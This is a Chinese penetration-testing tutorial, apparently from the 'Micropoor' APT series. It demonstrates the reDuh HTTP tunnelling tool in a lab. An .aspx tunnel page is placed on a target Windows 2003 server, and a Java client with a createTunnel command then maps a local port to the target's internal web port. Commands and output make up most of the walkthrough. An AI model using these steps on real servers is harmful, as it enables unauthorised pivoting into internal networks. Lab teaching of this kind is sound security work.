# 专注APT攻击与防御
https://micropoor.blogspot.com/

**reDuh简介：**

reDuh是sensepost由2008-07年发布，从本质上讲，可以将JSP/PHP/ASP/ASPX等页面上传到目标服务器，便可以访问该服务器后面的主机。

BlackHat USA 2008介绍：
https://drive.google.com/open?id=1AqmtuBnHQJS-FjVHzJMNNWokda048By-

Github：
https://github.com/sensepost/reDuh

**攻击机：** 
192.168.1.5 Debian
192.168.1.4 Windows 7

**靶机：** 
192.168.1.119 Windows 2003

**安装：**
```bash
root@John:~# git clone https://github.com/sensepost/reDuh.git
Cloning into 'reDuh'...
remote: Enumerating objects: 47, done.
remote: Total 47 (delta 0), reused 0 (delta 0), pack‐reused 47
Unpacking objects: 100% (47/47), done.
root@John:~# cd reDuh/
root@John:~/reDuh# ls
README.markdown reDuhClient reDuhServers
```
![](media/1baa9c1874d47e57ff19724c1e050dd8.jpg)

**靶机执行：**
以aspx为demo。

![](media/853cde273f8ee0873156e9c624258201.jpg)

**攻击机执行：**
绑定端口：
```bash
root@John:~/reDuh/reDuhClient/dist# java ‐jar reDuhClient.jar http://192.168.1.119/reDuh.aspx
[Info]Querying remote web page for usable remote service port
[Info]Remote RPC port chosen as 42000
[Info]Attempting to start reDuh from 192.168.1.119:80/reDuh.aspx. Using service port 42000. Please wait...
[Info]reDuhClient service listener started on local port 1010
```
![](media/2596f6edba3d76db9a416b2011e8fb9b.jpg)

开启新terminal，建立隧道
命令如下：
[createTunnel][本地绑定端口]:127.0.0.1:[远程端口]
```bash
root@John:~# telnet 127.0.0.1 1010
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Welcome to the reDuh command line
>>[createTunnel]30080:127.0.0.1:80
Successfully bound locally to port 30080. Awaiting connections.
```
![](media/9a14208cab4886588559a38d694a5cf1.jpg)

攻击机端口前后对比：
```bash
root@John:~# netstat ‐ntlp
Active Internet connections (only servers)
Proto Recv‐Q Send‐Q Local Address Foreign Address State PID/Program na me
tcp 0 0 0.0.0.0:902 0.0.0.0:* LISTEN 809/vmware‐authdlau
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 674/sshd
tcp6 0 0 :::902 :::* LISTEN 809/vmware‐authdlau
tcp6 0 0 :::22 :::* LISTEN 674/sshd
root@John:~# netstat ‐ntlp
Active Internet connections (only servers)
Proto Recv‐Q Send‐Q Local Address Foreign Address State PID/Program na me
tcp 0 0 0.0.0.0:902 0.0.0.0:* LISTEN 809/vmware‐authdlau
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 674/sshd
tcp6 0 0 :::902 :::* LISTEN 809/vmware‐authdlau
tcp6 0 0 :::1010 :::* LISTEN 6102/java
tcp6 0 0 :::22 :::* LISTEN 674/sshd
tcp6 0 0 :::30080 :::\* LISTEN 6102/java 
```
![](media/525c8fec46511f49176e20b50a017226.jpg)

访问攻击机30080端口，既等价于访问靶机80端口
```bash
root@John:~# curl http://192.168.1.5:30080/
<html> 

<head>
<meta HTTP‐EQUIV="Content‐Type" Content="text/html; charset=gb2312"> 

<title ID=titletext>建设中</title>

</head> 

<body bgcolor=white> 

... 

</body>

</html>
```
![](media/4594e609d339d06fe44ecf11a575c966.jpg)


遗憾的是reDuh年代久远，使用繁琐，并官方已停止维护。但是它奠定了HTTP隧道。

>   Micropoor
